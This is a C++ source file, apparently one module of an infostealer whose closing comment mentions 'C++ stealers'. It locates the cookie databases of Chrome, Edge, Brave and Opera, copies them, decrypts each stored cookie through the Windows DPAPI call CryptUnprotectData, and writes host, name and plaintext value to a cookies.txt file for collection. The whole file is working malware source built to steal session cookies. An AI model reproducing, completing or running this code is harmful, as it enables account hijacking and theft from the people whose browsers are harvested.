#include "cookies.h"
#include "utils.h"

#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <sqlite3.h>
#include <wincrypt.h>

//chromium browsers and their base paths relative to %LOCALAPPDATA%
const std::vector<std::string> browsers = {
    R"(Google\Chrome\User Data\Default)",
    R"(Microsoft\Edge\User Data\Default)",
    R"(BraveSoftware\Brave-Browser\User Data\Default)",
    R"(Opera Software\Opera Stable)"
};

static std::string get_local_appdata() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        return std::string(path);
    }
    return "";
}

static std::string copy_cookies_db(const std::string& src) {
    std::string tempPath = create_temp_directory("b0nec0me_tmp");
    std::string dest = tempPath + "CookiesCopy.db";

    try {
        std::filesystem::copy_file(src, dest, std::filesystem::copy_options::overwrite_existing);
        return dest;
    } catch (...) {
        return "";
    }
}

static std::string decrypt_cookie_value(const std::vector<unsigned char>& encrypted) {
    DATA_BLOB inBlob;
    inBlob.pbData = const_cast<BYTE*>(encrypted.data());
    inBlob.cbData = (DWORD)encrypted.size();

    DATA_BLOB outBlob;
    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
        std::string decrypted((char*)outBlob.pbData, outBlob.cbData);
        LocalFree(outBlob.pbData);
        return decrypted;
    }
    return "";
}

void dump_cookies(const std::string& outputFolder) {
    std::string localAppData = get_local_appdata();
    if (localAppData.empty()) return;

    std::ofstream outFile(outputFolder + "cookies.txt", std::ios::out | std::ios::app);

    for (const auto& basePath : browsers) {
        std::string cookiesPath = localAppData + "\\" + basePath + "\\Cookies";
        if (!std::filesystem::exists(cookiesPath)) continue;

        std::string dbCopy = copy_cookies_db(cookiesPath);
        if (dbCopy.empty()) continue;

        sqlite3* db;
        if (sqlite3_open(dbCopy.c_str(), &db) != SQLITE_OK) {
            sqlite3_close(db);
            continue;
        }

        const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char* host = sqlite3_column_text(stmt, 0);
            const unsigned char* name = sqlite3_column_text(stmt, 1);
            const void* encrypted_blob = sqlite3_column_blob(stmt, 2);
            int blob_size = sqlite3_column_bytes(stmt, 2);

            if (host && name && encrypted_blob && blob_size > 0) {
                std::vector<unsigned char> encrypted_value(
                    (const unsigned char*)encrypted_blob,
                    (const unsigned char*)encrypted_blob + blob_size);

                std::string decrypted_value = decrypt_cookie_value(encrypted_value);
                if (!decrypted_value.empty()) {
                    outFile << "Host: " << host << "\n";
                    outFile << "Name: " << name << "\n";
                    outFile << "Value: " << decrypted_value << "\n";
                    outFile << "------------------------------\n"; 
                }
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
        std::filesystem::remove(dbCopy);
    }

    outFile.close();
}
//C >>>>> C++, buttt ngl, i have more experience with C++ stealers
